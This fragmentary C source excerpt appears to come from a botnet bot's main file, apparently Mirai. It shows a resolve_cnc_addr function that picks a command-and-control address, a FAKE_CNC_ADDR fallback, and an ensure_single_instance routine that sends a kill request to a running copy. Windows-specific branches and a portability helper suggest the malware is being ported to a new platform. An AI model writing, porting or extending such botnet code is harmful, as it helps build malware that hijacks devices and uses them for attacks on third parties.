...
// Helper: write an IPv4 address value into a sockaddr_in in a portable way.
// Some platforms expose sin_addr as a struct with member s_addr, others as an integer type.
// Using memcpy lets us write the 32-bit address bytes into sin_addr regardless of how it's
// represented in the platform headers (struct in_addr vs in_addr_t).
...
#ifdef _WIN32
    set_in_addr(&srv_addr.sin_addr, inet_addr("127.0.0.1")); // Use localhost for Windows
#else
    set_in_addr(&srv_addr.sin_addr, FAKE_CNC_ADDR);
#endif
...
static void resolve_cnc_addr(void)
{
    ...
    // For Windows, use localhost or a fixed IP
#ifdef _WIN32
    set_in_addr(&srv_addr.sin_addr, inet_addr("127.0.0.1"));
#else
    set_in_addr(&srv_addr.sin_addr, entries->addrs[rand_next() % entries->addrs_len]);
#endif
...
static void ensure_single_instance(void)
{
...
#ifdef _WIN32
    set_in_addr(&addr.sin_addr, inet_addr("127.0.0.1"));
#else
    set_in_addr(&addr.sin_addr, local_bind ? INET_ADDR(127,0,0,1) : LOCAL_ADDR);
#endif
    ...
    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
        ...
        printf("[main] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
            ...
            set_in_addr(&addr.sin_addr, inet_addr("127.0.0.1"));
        #else
            set_in_addr(&addr.sin_addr, INADDR_ANY);
        #endif
                addr.sin_port = htons(SINGLE_INSTANCE_PORT);
